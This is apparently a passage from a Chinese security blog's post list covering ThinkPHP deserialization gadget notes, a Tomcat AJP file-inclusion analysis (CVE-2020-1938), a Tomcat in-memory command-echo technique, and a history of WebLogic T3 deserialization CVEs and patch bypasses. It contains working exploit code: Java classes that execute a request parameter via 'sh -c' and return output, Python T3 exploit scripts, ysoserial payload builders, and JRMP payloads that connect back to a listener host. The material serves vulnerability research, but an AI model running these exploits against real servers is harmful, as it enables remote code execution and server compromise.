$model-&gt;setTable($model); echo urlencode(serialize($model)); } 个人方法论反序列化起点起点只有两个 __walkup __destrusct 反序列化的中继点 要是某段代码等价于形如$this-&gt;obj1-&gt;method()，中继点可以是obj2的同名method方法，也可以是obj3__call方法 处理字符串的函数(可控$obj)，中继点可以是$obj的__toString 某段代码形如$this-&gt;obj[$key]，中继点可以__get或者实现了ArrayAccess的接口。 某段代码里面有new了新对象，那么中继点可以是那个对象的__contrust方法 总结一下触发__toString的 php内置函数会把传入变量当作字符串处理的时候，例如file_exists()，sprintf 与其它字符串发生运算的时候例如.、== php原生代码里面的异常处理类存在tostring调用点，实际使用时很好用 反序列化的终点 一般PHP中的call方法都是用来进行容错或者是动态调用,所以一般会在call方法中使用__call_user_func(\\$method, $args)，__call_user_func_array([\\$obj,\\$method], $args)，例如tp5.1 动态调用的方法，$可控方法($可控参数)，例如tp5.2 书写exp时候注意事项 尽量不进行省略步骤性质的优化，防止出现exp可以但实际环境不成功人为玄学的情况。 对单行执行的不获取返回值的函数进行省略（只要函数内部没有不会抛出异常）。 触发流程之后的代码都可以省略掉。 上面讲的个人心得是脱离框架写exp的思路，maybe直接在框架下的某个路由写exp效率更高。 杂受phar影响的函数 fileatime / filectime / filemtime stat / fileinode / fileowner / filegroup / fileperms file / file_get_contents / readfile / fopen file_exists / is_dir / is_executable / is_file / is_link / is_readable / is_writeable / is_writable parse_ini_file unlink copy 参考挖掘暗藏ThinkPHP中的反序列利用链ThinkPHP5.1.X反序列化利用链ThinkPHP5.2.x反序列化利用链ThinkPHP6.X反序列化利用链N1CTF2019 sql_manage出题笔记","link":"/2019/10/18/thinkphp%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%B3%BB%E5%88%97gadget%20%E5%A4%8D%E7%8E%B0/"},{"title":"tomcat ajp 漏洞分析","text":"什么是ajp简单理解成http的二进制优化版。 tomcat结构在Container部分，一个Host代表一个虚拟主机，一个Context代码一套web程序，一个Wrapper代表一个serlvlet。一个tomcat可以有多个Host，一个Host可以有多个Context，一个Context往往有多个Wrapper。 在Conector部分Endpoint的Acceptor监听连接，Handler用于处理接收到的Socket，在内部调用Processor进行处理。processor把信息读取出来并设置进request中对象最后交给Adaptor，Adapter将请求适配到Servlet容器进行具体的处理。 环境说明tomcat 7.0.96 12345678910111213141516171819202122232425262728293031&lt;?xml version=\"1.0\" encoding=\"ISO-8859-1\"?&gt;&lt;!-- Licensed to the Apache Software Foundation (ASF) under one or more contributor license agreements. See the NOTICE file distributed with this work for additional information regarding copyright ownership. The ASF licenses this file to You under the Apache License, Version 2.0 (the \"License\"); you may not use this file except in compliance with the License. You may obtain a copy of the License at http://www.apache.org/licenses/LICENSE-2.0 Unless required by applicable law or agreed to in writing, software distributed under the License is distributed on an \"AS IS\" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the License for the specific language governing permissions and limitations under the License.--&gt;&lt;web-app xmlns=\"http://java.sun.com/xml/ns/javaee\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation=\"http://java.sun.com/xml/ns/javaee http://java.sun.com/xml/ns/javaee/web-app_3_0.xsd\" version=\"3.0\" metadata-complete=\"true\"&gt; &lt;display-name&gt;Welcome to Tomcat&lt;/display-name&gt; &lt;description&gt; Welcome to Tomcat &lt;/description&gt;&lt;/web-app&gt; 代码流程跟踪代码跟踪从handler调用processor的process开始。process里面有两部很重要一个是prepareRequest，另一个是this.adapter.service。 prepareRequest先来看prepareRequest。顾名思义，这个函数的作用是把ajp的二进制版的http数据读取（请求方法，请求路径，http头等信息，不每处都截图了）并设置进request对象，然后设置一些对header和cookies长度或数量做一些限制。接下来会读取一个叫attributeCode的东西，payload有意把它设置成了10。这样他会把我们在payload中构造的attributes设置进request对象的attribute，后面任意读文件或者包含祸起就是从这里开始的。 1234567file_path = \"/WEB-INF/web.xml\"attributes = [ {\"name\": \"req_attribute\", \"value\": (\"javax.servlet.include.request_uri\", \"/\",)}, {\"name\": \"req_attribute\", \"value\": (\"javax.servlet.include.path_info\", file_path,)}, {\"name\": \"req_attribute\", \"value\": (\"javax.servlet.include.servlet_path\", \"/\",)},] adapter.service在adapter.service中会在postParseRequest中对url进行处理及合法性检查（这里面可能涉及到对url权限校验的问题以后有机会再聊）。如果合法的会进入下面的invoke。 跟进invoke后会发现是一连串疯狂的invoke，这里取几个有代表性的截图StandardEngineValve invokeStandardHostValve invokeStandardContextValve invoke最后进入StandardWrapperValve的invokewrapper.allocate会返回这次请求对应的servlet，因为我们访问路径是/，所以默认对应index.jsp，所以由jspServlet来处理。接下来进入过滤器链doFilter内部调用internalDoFilter在internalDoFilter中会遍历所有注册过的filter然后进行过滤。遍历完成后会调用对应servlet的services方法。这里会把payload中的 javax.servlet.include.request_uri javax.servlet.include.path_info提取并拼接到一起形成jspUri。这里jspUri会被传入，正常情况下这里传入的是jsp，tomcat会把jsp转为servlet，但是因为我们传入的路径是是非jsp文件不符合语法所以这部分原样输出。因此另一种使用方法也呼之欲出，如果有一个上传洞可以把文件上传到webapp目录下(不管什么后缀）那么我们可以包含这个文件达到rce效果（和php很像）。 补充，只能包含webapp下面的东西。在读取之前会对传入的路径进行格式化，并在格式化后强制加/，无法../跳出。 代码流程跟踪图 受影响版本 Apache Tomcat 9.x &lt; 9.0.31 Apache Tomcat 8.x &lt; 8.5.51 Apache Tomcat 7.x &lt; 7.0.100 Apache Tomcat 6.x 其他文中分析的是最理想的情况实际利用会受到过滤器或是框架的影响关于这部分内容可以看如何更加精确的检测Tomcat AJP文件包含漏洞(CVE-2020-1938) 参考Tomcat Ajp协议文件包含漏洞分析tomcat幽灵猫分析","link":"/2020/04/26/tomcat-ajp-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"},{"title":"tomcat不出网回显连续剧第六集","text":"首发于先知社区 前情提要这周回顾了一下我看到的前人关于tomcat回显和无文件webshell的文章。发现各个师傅的方法各有优劣，下面简单总结一下（总结不对的地方还请各位师傅指出）。 基于内存 Webshell 的无文件攻击技术研究，观星大哥的文章，通杀spring，能解决实战只能够遇到的大部分情况了。 Tomcat中一种半通用回显方法，这篇文章讲了通过反射修改ApplicationFilterChain参数来让tomcat再下一次请求的时候在线程中缓存req和resp，不足之处在于shiro无法回显。 基于tomcat的内存 Webshell 无文件攻击技术，通过上一篇的方法获取到req进一步获取context，然后动态注册filter，不足之处在于使用的是上一篇的获取req的思路所以也无法shiro回显。 基于全局储存的新思路 | Tomcat的一种通用回显方法研究，这篇文章通过currentThread.getContextClassLoader()获取StandardContext，进一步获取到response，解决了shiro回显的问题，不足在于tomcat7中无法获取到StandardContext。 基于Tomcat无文件Webshell研究，总结上面文章的方法，不足之处在于无法解决tomcat7+shiro的问题。 所以这里提出一种新的回显方案解决一下tomcat7+shiro这个阴暗的角落（经测试tomcat8仍然适用）。测试环境：macos+tomcat7,8+shiro-simple-web 再看register在上面提到的第四篇文章中提到包含有request（有了request就有response）的rp会被储存在global中，但其实再往下看会发现rp被注册进了组件。既然注册进去了肯定存放在哪里的，接下来动静结合调代码找就好了，代码跟踪过于冗长而且我也没细细探究每一步的意义，就不装模作样的分析了，这里直接给结论。 通过idea的计算功能我们可以符合直觉的拿到response，实际想获取还是需要各种反射的。tomcat7,8获取这条链的方式大同小异，变化之处在于name=&quot;http-bio-8888&quot;,type=GlobalRequestProcessor，其中8888是tomcat服务端端口，在tomcat8里面bio变为nio。关于bio，nio的细节可以参考这篇文章。 除此之外在实际场景下会有很多requests是要遍历processors中的各个requests。 demo代码tomcat8的demo 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586package ysoserial;import com.sun.org.apache.xalan.internal.xsltc.DOM;import com.sun.org.apache.xalan.internal.xsltc.TransletException;import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;import com.sun.org.apache.xml.internal.serializer.SerializationHandler;import org.apache.coyote.Request;import org.apache.tomcat.util.buf.ByteChunk;import org.apache.tomcat.util.modeler.Registry;import javax.management.MBeanServer;import java.io.InputStream;import java.lang.reflect.Field;import java.util.ArrayList;import java.util.HashMap;import java.util.Scanner;public class tomcat82 extends AbstractTranslet { public tomcat82() { try{ MBeanServer mbeanServer = Registry.getRegistry((Object)null, (Object)null).getMBeanServer(); Field field = Class.forName(\"com.sun.jmx.mbeanserver.JmxMBeanServer\").getDeclaredField(\"mbsInterceptor\"); field.setAccessible(true); Object obj = field.get(mbeanServer); field = Class.forName(\"com.sun.jmx.interceptor.DefaultMBeanServerInterceptor\").getDeclaredField(\"repository\"); field.setAccessible(true); obj = field.get(obj); field = Class.forName(\"com.sun.jmx.mbeanserver.Repository\").getDeclaredField(\"domainTb\"); field.setAccessible(true); HashMap obj2 = (HashMap)field.get(obj); obj = ((HashMap)obj2.get(\"Catalina\")).get(\"name=\\\"http-nio-8888\\\",type=GlobalRequestProcessor\"); field = Class.forName(\"com.sun.jmx.mbeanserver.NamedObject\").getDeclaredField(\"object\"); field.setAccessible(true); obj = field.get(obj); field = Class.forName(\"org.apache.tomcat.util.modeler.BaseModelMBean\").getDeclaredField(\"resource\"); field.setAccessible(true); obj = field.get(obj); field = Class.forName(\"org.apache.coyote.RequestGroupInfo\").getDeclaredField(\"processors\"); field.setAccessible(true); ArrayList obj3 = (ArrayList)field.get(obj); field = Class.forName(\"org.apache.coyote.RequestInfo\").getDeclaredField(\"req\"); field.setAccessible(true); boolean isLinux = true; String osTyp = System.getProperty(\"os.name\"); if (osTyp != null &amp;&amp; osTyp.toLowerCase().contains(\"win\")) { isLinux = false; } for (int i = 0; i &lt; obj3.size(); i++) { Request obj4 = (Request) field.get(obj3.get(i)); String username = obj4.getParameters().getParameter(\"username\"); if(username != null){ String[] cmds = isLinux ? new String[]{\"sh\", \"-c\", username} : new String[]{\"cmd.exe\", \"/c\", username}; InputStream in = Runtime.getRuntime().exec(cmds).getInputStream(); Scanner s = new Scanner(in).useDelimiter(\"\\\\a\"); String output = \"\"; while (s.hasNext()){ output += s.next(); } byte[] buf = output.getBytes(); ByteChunk bc = new ByteChunk(); bc.setBytes(buf, 0, buf.length); obj4.getResponse().doWrite(bc); break; } } } catch (Exception e){ } } public void transform(DOM document, SerializationHandler[] handlers) throws TransletException { } public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException { }} tomcat7的demo 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990package ysoserial;import com.sun.org.apache.xalan.internal.xsltc.DOM;import com.sun.org.apache.xalan.internal.xsltc.TransletException;import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;import com.sun.org.apache.xml.internal.serializer.SerializationHandler;import org.apache.coyote.Request;import org.apache.tomcat.util.buf.ByteChunk;import org.apache.tomcat.util.modeler.Registry;import javax.management.MBeanServer;import java.io.InputStream;import java.lang.reflect.Field;import java.util.ArrayList;import java.util.HashMap;import java.util.Scanner;public class tomcat72 extends AbstractTranslet { public tomcat72(){ try{ MBeanServer mbeanServer = Registry.getRegistry((Object)null, (Object)null).getMBeanServer(); Field field = Class.forName(\"com.sun.jmx.mbeanserver.JmxMBeanServer\").getDeclaredField(\"mbsInterceptor\"); field.setAccessible(true); Object obj = field.get(mbeanServer); field = Class.forName(\"com.sun.jmx.interceptor.DefaultMBeanServerInterceptor\").getDeclaredField(\"repository\"); field.setAccessible(true); obj = field.get(obj); field = Class.forName(\"com.sun.jmx.mbeanserver.Repository\").getDeclaredField(\"domainTb\"); field.setAccessible(true); HashMap obj2 = (HashMap)field.get(obj); obj = ((HashMap)obj2.get(\"Catalina\")).get(\"name=\\\"http-bio-8888\\\",type=GlobalRequestProcessor\"); field = Class.forName(\"com.sun.jmx.mbeanserver.NamedObject\").getDeclaredField(\"object\"); field.setAccessible(true); obj = field.get(obj); field = Class.forName(\"org.apache.tomcat.util.modeler.BaseModelMBean\").getDeclaredField(\"resource\"); field.setAccessible(true); obj = field.get(obj); field = Class.forName(\"org.apache.coyote.RequestGroupInfo\").getDeclaredField(\"processors\"); field.setAccessible(true); ArrayList obj3 = (ArrayList)field.get(obj); field = Class.forName(\"org.apache.coyote.RequestInfo\").getDeclaredField(\"req\"); field.setAccessible(true); boolean isLinux = true; String osTyp = System.getProperty(\"os.name\"); if (osTyp != null &amp;&amp; osTyp.toLowerCase().contains(\"win\")) { isLinux = false; } for (int i = 0; i &lt; obj3.size(); i++) { Request obj4 = (Request) field.get(obj3.get(i)); String username = obj4.getParameters().getParameter(\"username\"); if(username != null){ String[] cmds = isLinux ? new String[]{\"sh\", \"-c\", username} : new String[]{\"cmd.exe\", \"/c\", username}; InputStream in = Runtime.getRuntime().exec(cmds).getInputStream(); Scanner s = new Scanner(in).useDelimiter(\"\\\\a\"); String output = \"\"; while (s.hasNext()){ output += s.next(); } byte[] buf = output.getBytes(); ByteChunk bc = new ByteChunk(); bc.setBytes(buf, 0, buf.length); obj4.getResponse().doWrite(bc); break; } } } catch (Exception e) {// System.out.println(\"=======================\");// System.out.println(e); } } public void transform(DOM document, SerializationHandler[] handlers) throws TransletException { } public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException { }} 另外如果有师傅在复现的时候发现header超长，可以参考缩小ysoserial payload体积的几个方法。（也可以参考长亭师傅给的修改header头的思路，实际弄走的时候也许会遇到一些坑） tomcat7+simple-shiro-web成功复现 最后感谢大师傅们开源的自己的思路，学到很多。其次在研究这种方法的时候发现还有其他很多MBean，也许还有很多好玩的东西？","link":"/2020/04/09/tomcat%E4%B8%8D%E5%87%BA%E7%BD%91%E5%9B%9E%E6%98%BE%E8%BF%9E%E7%BB%AD%E5%89%A7%E7%AC%AC%E5%85%AD%E9%9B%86/"},{"title":"weblogic历史T3反序列化漏洞及补丁梳理","text":"环境搭建使用ateam大哥开源的调试环境Weblogic环境搭建工具 漏洞环境搭建12docker build --build-arg JDK_PKG=jdk-7u21-linux-x64.tar.gz --build-arg WEBLOGIC_JAR=wls1036_generic.jar -t weblogic1036jdk7u21 .docker run -d -p 7001:7001 -p 8453:8453 -p 5556:5556 --name weblogic1036jdk7u21 weblogic1036jdk7u21 调试环境搭建将weblogic依赖的jar包拷贝出来并导入idea。 1234mkdir wlserver1036docker cp weblogic1036jdk7u21:/u01/app/oracle/middleware/modules ./wlserver1036docker cp weblogic1036jdk7u21:/u01/app/oracle/middleware/wlserver/server/lib ./wlserver1036docker cp weblogic1036jdk7u21:/u01/app/oracle/middleware/coherence_3.7/lib ./coherence_3.7/lib 远程调试配置 T3 协议说明t3是oracle对rmi的增强，和rmi一样在网络间传输时数据是序列化过的。文章的重点在于分析漏洞以及补丁为什么可以绕过，就不分析t3协议数据的格式了，在复现时我们只需要将生成的恶意序列化数据套在py模版中即可。如果有师傅想对weblogic体系及其t3协议的正常使用感兴趣推荐阅读WebLogic安全研究报告。 CVE-2015-4852t3协议的传输过来的数据会在weblogic.rjvm.InboundMsgAbbrev#readObject中读取并进行反序列化。因为是t3第一洞所以可以看到ServerChannelInputStream的resolveClass并没有任何做防御。自带cc链 所以只需要把ysoserial的生成的payload嵌入t3协议即可。 123456789101112131415161718192021222324252627282930313233343536373839404142434445import socketimport sysimport structimport reimport subprocessimport binasciidef get_payload1(gadget, command): JAR_FILE = '/Users/cengsiqi/Desktop/javasectools/ysoserial/target/ysoserial-0.0.6-SNAPSHOT-all.jar' popen = subprocess.Popen(['java', '-jar', JAR_FILE, gadget, command], stdout=subprocess.PIPE) return popen.stdout.read()def get_payload2(path): with open(path, \"rb\") as f: return f.read()def exp(host, port, payload): sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) sock.connect((host, port)) handshake = \"t3 12.2.3\\nAS:255\\nHL:19\\nMS:10000000\\n\\n\".encode() sock.sendall(handshake) data = sock.recv(1024) pattern = re.compile(r\"HELO:(.*).false\") version = re.findall(pattern, data.decode()) if len(version) == 0: print(\"Not Weblogic\") return print(\"Weblogic {}\".format(version[0])) data_len = binascii.a2b_hex(b\"00000000\") #数据包长度，先占位，后面会根据实际情况重新 t3header = binascii.a2b_hex(b\"016501ffffffffffffffff000000690000ea60000000184e1cac5d00dbae7b5fb5f04d7a1678d3b7d14d11bf136d67027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006\") #t3协议头 flag = binascii.a2b_hex(b\"fe010000\") #反序列化数据标志 payload = data_len + t3header + flag + payload payload = struct.pack('&gt;I', len(payload)) + payload[4:] #重新计算数据包长度 sock.send(payload)if __name__ == \"__main__\": host = \"127.0.0.1\" port = 7001 gadget = \"CommonsCollections1\" #CommonsCollections1 Jdk7u21 command = \"touch /tmp/CVE-2015-4852\" payload = get_payload1(gadget, command) exp(host, port, payload) CVE-2015-4852的修复补丁：2016年1月 p21984589_1036_Generic修复方法是在resolveClass中引入了 ClassFilter.isBlackListed进行过滤，跟进weblogic.rmi.ClassFilter可以看到黑名单内容。 除此之外，另外几个反序列化点也被加了相同的过滤（不一一打开看了）。 反序列化两个关键点，一个是触发反序列化的点，二是gadget。现在反序列化触发点有了，后面的t3的cve就是绕黑名单的各种技巧了。 为了让后面的分析更具有说服力，这里以10.3.6为例说明如何打补丁。 12345678docker run -it -d -p 7001:7001 -p 8453:8453 -p 5556:5556 --name weblogic1036jdk7u21 weblogic1036jdk7u21 /bin/bashdocker cp /Users/cengsiqi/Downloads/p21984589_1036_Generic weblogic1036jdk7u21:/p21984589_1036_Genericdocker exec -it weblogic1036jdk7u21 /bin/bashcd /p21984589_1036_Genericmv patch-catalog_23510.xml patch-catalog.xmlcd /u01/app/oracle/middleware/utils/bsu./bsu.sh -install -patch_download_dir=/p21984589_1036_Generic -patchlist=S8C2 -prod_dir=/u01/app/oracle/middleware/wlserver//u01/app/oracle/Domains/ExampleSilentWTDomain/bin/startWebLogic.sh 如果打补丁时出现如下错误需要自行把bsu.sh中的内存参数MEM_ARGS调大一点。成功后截图如下这时再尝试打会出现Unauthorized CVE-2016-0638weblogic.jms.common.StreamMessageImpl没在黑名单，在其反序列化时会读取一段数据并进行反序列化，我们可以把这段数据伪造成rce payload。 12345678910111213141516171819202122232425262728293031323334import weblogic.jms.common.StreamMessageImpl;import java.io.*;public class CVE_2016_0638 { public static void main(String[] args) throws IOException { byte[] payload = exec(\"CommonsCollections1\", \"touch /tmp/CVE_2016_0638\"); StreamMessageImpl streamMessage = new StreamMessageImpl(payload); ser(streamMessage, \"CVE_2016_0638.ser\"); } public static byte[] exec(String gadget, String command) throws IOException { String[] cmd = {\"java\", \"-jar\", \"/Users/cengsiqi/Desktop/javasectools/ysoserial/target/ysoserial-0.0.6-SNAPSHOT-all.jar\", gadget, command}; InputStream in = Runtime.getRuntime().exec(cmd).getInputStream(); ByteArrayOutputStream baos = new ByteArrayOutputStream(); byte[] b = new byte[4096]; int a = -1; while ((a = in.read(b)) != -1) { baos.write(b, 0, a); } return baos.toByteArray(); } public static void ser(Object obj, String serName) throws IOException { File file = new File(serName); ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(file)); oos.writeObject(obj); System.out.println(\"-------序列化成功\" + serName); }} 乱入一个QAQ：StreamMessageImpl可以过黑名单很好理解，但是为啥CommonsCollections1依旧可以成功，CommonsCollections1(org.apache.commons.collections.functors)不是在黑名单里面吗？ A：答案是ServerChannelInputStream没有过滤到org.apache.commons.collections.functors（废话）。细节是这样的：ServerChannelInputStream的resolveClass检验到是StreamMessageImpl，不在黑名单里面，通过。然后在反序列化流程中会调用StreamMessageImpl的readExternal，readExternal内部又new了新的ObjectInputStream（以后简称ois）并从缓冲区读反序列化数据再次调用readObject，这里原生的ois就是原生的resolveClass方法没有过滤。 CVE-2016-0638的修复补丁：2016年4月p22505423_1036_Generic把原生的ois换成了FilteringObjectInputStream CVE-2016-3510weblogic.corba.utils.MarshalledObject不在黑名单中，并且在readResolve的时候会读取objBytes的值赋给新new的ois。那么我们在objBytes中放入rce payload即可。 123456789101112131415161718192021222324252627282930313233343536373839import weblogic.corba.utils.MarshalledObject;import weblogic.jms.common.StreamMessageImpl;import java.io.*;import java.lang.reflect.Field;public class CVE_2016_3510 { public static void main(String[] args) throws IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException { byte[] payload = exec(\"CommonsCollections1\", \"touch /tmp/CVE_2016_3510\"); MarshalledObject marshalledObject = new MarshalledObject(\"foo\"); Class cls = marshalledObject.getClass(); Field field = cls.getDeclaredField(\"objBytes\"); field.setAccessible(true); field.set(marshalledObject, payload); ser(marshalledObject,\"./CVE_2016_3510.ser\"); } public static byte[] exec(String gadget, String command) throws IOException { String[] cmd = {\"java\", \"-jar\", \"/Users/cengsiqi/Desktop/javasectools/ysoserial/target/ysoserial-0.0.6-SNAPSHOT-all.jar\", gadget, command}; InputStream in = Runtime.getRuntime().exec(cmd).getInputStream(); ByteArrayOutputStream baos = new ByteArrayOutputStream(); byte[] b = new byte[4096]; int a = -1; while ((a = in.read(b)) != -1) { baos.write(b, 0, a); } return baos.toByteArray(); } public static void ser(Object obj, String serName) throws IOException { File file = new File(serName); ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(file)); oos.writeObject(obj); System.out.println(\"-------序列化成功\" + serName); }} CVE-2016-3510的修复补丁：2016年10月 p23743997_1036_Generic重写了resolveClass方法，加了过滤。 CVE-2017-3248利用JRMPClient进行带外rce，这个技巧相信看过橘子师傅shiro rce的操作的师很熟悉了。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647import socketimport sysimport structimport reimport subprocessimport binasciidef get_payload1(gadget, command): JAR_FILE = '/Users/cengsiqi/Desktop/javasectools/ysoserial/target/ysoserial-0.0.6-SNAPSHOT-all.jar' popen = subprocess.Popen(['java', '-jar', JAR_FILE, gadget, command], stdout=subprocess.PIPE) return popen.stdout.read()def get_payload2(path): with open(path, \"rb\") as f: return f.read()def exp(host, port, payload): sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) sock.connect((host, port)) handshake = \"t3 12.2.3\\nAS:255\\nHL:19\\nMS:10000000\\n\\n\".encode() sock.sendall(handshake) data = sock.recv(1024) pattern = re.compile(r\"HELO:(.*).false\") version = re.findall(pattern, data.decode()) if len(version) == 0: print(\"Not Weblogic\") return print(\"Weblogic {}\".format(version[0])) data_len = binascii.a2b_hex(b\"00000000\") #数据包长度，先占位，后面会根据实际情况重新 t3header = binascii.a2b_hex(b\"016501ffffffffffffffff000000690000ea60000000184e1cac5d00dbae7b5fb5f04d7a1678d3b7d14d11bf136d67027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006\") #t3协议头 flag = binascii.a2b_hex(b\"fe010000\") #反序列化数据标志 payload = data_len + t3header + flag + payload payload = struct.pack('&gt;I', len(payload)) + payload[4:] #重新计算数据包长度 sock.send(payload)if __name__ == \"__main__\": host = \"127.0.0.1\" port = 7001 gadget = \"JRMPClient\" #CommonsCollections1 Jdk7u21 JRMPClient command = \"192.168.1.3:8080\" # payload = get_payload1(gadget, command) ) ) exp(host, port, payload) CVE-2017-3248的修复补丁：p24667634_1036_Generic官方的修复是新加resolveProxyClass，过滤java.rmi.registry.Registry CVE-2018-2628上面提到过滤了Registry，这样ysoserial中原生JRMPClient就打不了，但是仍然有多种办法bypass。 替换接口引用@lpwd师傅的话： 这个CVE廖也提交了绕过，他的绕过是用java.rmi.activation.Activator替换java.rmi.registry.Registry，从而绕过resolveProxyClass的判断。其实这里对接口没有要求，不一定是rmi接口，随便找一个接口都行，比如java.util.Map 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051package ysoserial.payloads;import java.lang.reflect.Proxy;import java.rmi.server.ObjID;import java.rmi.server.RemoteObjectInvocationHandler;import java.util.Random;import sun.rmi.server.UnicastRef;import sun.rmi.transport.LiveRef;import sun.rmi.transport.tcp.TCPEndpoint;import ysoserial.payloads.annotation.Authors;import ysoserial.payloads.annotation.PayloadTest;import ysoserial.payloads.util.PayloadRunner;import java.util.Map;@SuppressWarnings ( { \"restriction\"} )@PayloadTest( harness=\"ysoserial.test.payloads.JRMPReverseConnectSMTest\")@Authors({ Authors.MBECHLER })public class JRMPClient3 extends PayloadRunner implements ObjectPayload&lt;Map&gt; { public Map getObject ( final String command ) throws Exception { String host; int port; int sep = command.indexOf(':'); if ( sep &lt; 0 ) { port = new Random().nextInt(65535); host = command; } else { host = command.substring(0, sep); port = Integer.valueOf(command.substring(sep + 1)); } ObjID id = new ObjID(new Random().nextInt()); // RMI registry TCPEndpoint te = new TCPEndpoint(host, port); UnicastRef ref = new UnicastRef(new LiveRef(id, te, false)); RemoteObjectInvocationHandler obj = new RemoteObjectInvocationHandler(ref); Map proxy = (Map) Proxy.newProxyInstance( JRMPClient.class.getClassLoader(), new Class[] { Map.class }, obj); return proxy; } public static void main ( final String[] args ) throws Exception { Thread.currentThread().setContextClassLoader(JRMPClient.class.getClassLoader()); PayloadRunner.run(JRMPClient.class, args); }} 直接用UnicastRefCVE-2017-3248的构造中把UnicastRef放入了Registry，其实用UnicastRef也能在反序列化的时候发起jrmp请求。这种方法要比替换接口的干脆很多。在ysoserial中加一个JRMPClient2 1234567891011121314151617181920212223242526272829303132333435363738394041424344package ysoserial.payloads;import java.rmi.server.ObjID;import java.util.Random;import sun.rmi.server.UnicastRef;import sun.rmi.transport.LiveRef;import sun.rmi.transport.tcp.TCPEndpoint;import ysoserial.payloads.annotation.Authors;import ysoserial.payloads.annotation.PayloadTest;import ysoserial.payloads.util.PayloadRunner;@SuppressWarnings ( { \"restriction\"} )@PayloadTest( harness=\"ysoserial.test.payloads.JRMPReverseConnectSMTest\")@Authors({ Authors.MBECHLER })public class JRMPClient2 extends PayloadRunner implements ObjectPayload&lt;UnicastRef&gt; { public UnicastRef getObject ( final String command ) throws Exception { String host; int port; int sep = command.indexOf(':'); if ( sep &lt; 0 ) { port = new Random().nextInt(65535); host = command; } else { host = command.substring(0, sep); port = Integer.valueOf(command.substring(sep + 1)); } ObjID id = new ObjID(new Random().nextInt()); // RMI registry TCPEndpoint te = new TCPEndpoint(host, port); UnicastRef ref = new UnicastRef(new LiveRef(id, te, false)); return ref; } public static void main ( final String[] args ) throws Exception { Thread.currentThread().setContextClassLoader(JRMPClient.class.getClassLoader()); PayloadRunner.run(JRMPClient.class, args); }} CVE-2018-2628的修复补丁：2018年四月发布的p27395085_1036_GenericUnicastRef在weblogic.utils.io.oif.WebLogicFilterConfig中加进了黑名单。 CVE-2018-2893streamMessageImpl + jrmp代理类绕过。先来看payload 1234567891011121314151617181920212223242526272829303132333435363738394041import sun.rmi.server.UnicastRef;import sun.rmi.transport.LiveRef;import sun.rmi.transport.tcp.TCPEndpoint;import weblogic.jms.common.StreamMessageImpl;import java.io.*;import java.lang.reflect.Proxy;import java.rmi.registry.Registry;import java.rmi.server.ObjID;import java.rmi.server.RemoteObjectInvocationHandler;import java.util.Random;public class CVE_2018_2893 { public static void main(String[] args) throws IOException { ObjID objID = new ObjID(new Random().nextInt()); // RMI registry TCPEndpoint tcpEndpoint = new TCPEndpoint(\"192.168.1.3\", 8080); UnicastRef unicastRef = new UnicastRef(new LiveRef(objID, tcpEndpoint, false)); RemoteObjectInvocationHandler remoteObjectInvocationHandler = new RemoteObjectInvocationHandler(unicastRef); Object object = Proxy.newProxyInstance(Thread.currentThread().getContextClassLoader(), new Class[] { Registry.class }, remoteObjectInvocationHandler); StreamMessageImpl streamMessage = new StreamMessageImpl(serialize(object)); ser(streamMessage, \"CVE_2018_2893.ser\"); } public static void ser(Object obj, String serName) throws IOException { File file = new File(serName); ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(file)); oos.writeObject(obj); System.out.println(\"-------序列化成功\" + serName); } public static byte[] serialize(final Object obj) throws IOException { final ByteArrayOutputStream out = new ByteArrayOutputStream(); serialize(obj, out); return out.toByteArray(); } public static void serialize(final Object obj, final OutputStream out) throws IOException { final ObjectOutputStream objOut = new ObjectOutputStream(out); objOut.writeObject(obj); }} 什么鬼？payload中用到的streamMessageImpl、Registry、UnicastRef不是已经被修复了吗？ 我们来细看一下怎么修的。streamMessageImpl的readExternal内部是拿给FilteringObjectInputStream过滤。 FilteringObjectInputStream只是对普通类的反序列化进行了拦截，并没有对代理类进行拦截。对你没看错，虽然在CVE-2017-3248后ServerChannelInoutStream类中的resolveProxyClass过滤了Registry，但是这里的FilteringObjectInputStream并没有实现resolveProxyClass过滤代理类。 那UnicastRef又为啥逃过一劫？我们来看UnicastRef在序列化的时候经历了什么。在上面的payload中UnicastRef传入了RemoteObjectInvocationHandler，RemoteObjectInvocationHandler继承自RemoteObject。在RemoteObject writeObject时只是写入UnicastRef的类名（并没有把他作为一个类序列化）然后调用UnicastRef的writeExternal。 UnicastRef又用到了LiveRef的write，写入了反序列化时需要反连的host和端口。 由此可见UnicastRef从始至终并没有作为一个类被反序列化，如果分析这个payload的resolve时序会发现完全没有反序列化UnicastRef。如果你分析序列化出来的数据会发现*UnicastRef**只是TC_BLOCKDATA而不是TC_CLASSDESC。 CVE-2018-2893的修复补丁：18年7月 p27919965_1036_Generic这次修复把经过resolveClass的java.rmi.server.RemoteObjectInvocationHandler给过滤了。 CVE-2018-3245再次引用@lpwd师傅的话： 根据前面的分析可知，我们只需要找一个类似java.rmi.server.RemoteObjectInvocationHandler的类进行替换，就能继续绕过了。那么这个类应该满足以下条件：继承远程类：java.rmi.server.RemoteObject不在黑名单里边（java.rmi.activation. 